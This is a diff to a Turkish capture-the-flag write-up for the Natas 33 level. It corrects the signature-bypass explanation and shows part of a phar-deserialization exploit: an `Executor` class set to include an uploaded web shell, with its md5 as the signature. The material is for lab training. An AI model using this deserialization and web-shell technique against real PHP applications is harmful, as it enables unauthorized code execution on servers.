@@ -96,23 +96,15 @@ if ($signature !== $expected) {
 }
 ```
 
-Ama Natas 33'te `$signature` değişkeni:
+Ama Natas 33'teki kontrol **katı** (`===`): `if ($this->signature === md5(file_get_contents($this->filename)))`. Burada `$signature = True` numarası **çalışmaz** — `True === "herhangi_bir_md5"` her zaman **false**'tur (bool ile string tip uyuşmaz), yani type-juggling bypass'ı yok.
+
+Asıl püf nokta: **hem dosyayı hem de phar metadata'sındaki `$signature`'ı SEN kontrol ediyorsun.** Yüklediğin shell'in içeriğinin md5'ini kendin hesaplayıp `$signature`'a yazarsın:
 
 ```php
-class Executor {
-    private $filename;
-    private $signature = True;    // ← True!
-    private $init = False;
-}
+$signature = md5(file_get_contents("shell.php"));   // yüklediğin dosyanın md5'i
 ```
 
-`$signature = True` → `True == md5(...)` → PHP loose comparison:
-
-```php
-True == "anystring"   // true!  (non-empty string → truthy)
-```
-
-Yani imza kontrolü `True == [herhangi_bir_md5]` → her zaman true → bypass!
+Böylece `$signature === md5(file_get_contents($filename))` **tam olarak sağlanır** → `include($filename)` çalışır. (Katı karşılaştırmada type-juggling yok; onun yerine imzayı gerçek md5'e eşitliyoruz.)
 
 ---
 
@@ -153,7 +145,7 @@ if(isset($_POST['filename'])) {
 
 **Analiz:**
 
-1. `$signature = True` → imza kontrolü her zaman geçer (loose comparison)
+1. `===` katı karşılaştırma → imzayı geçmek için `$signature`'ı yüklediğin dosyanın md5'ine eşitlersin (aşağıda hesaplanıyor)
 2. `__destruct()` → `include($this->filename)` → phar:// ile web shell include et
 3. Dosya yükleme var → kötü amaçlı phar yükleyebiliriz
 
@@ -180,7 +172,8 @@ curl -u natas33:[şifre] \
 <?php
 class Executor {
     private $filename = "shell.php";
-    private $signature = True;
+    // shell.php'nin (yüklediğin dosyanın) içeriğinin md5'i — === kontrolünü geçer:
+    private $signature = "SHELL_MD5";   // = md5(file_get_contents("shell.php")); önce hesapla, buraya yaz
     private $init = True;
 }
 
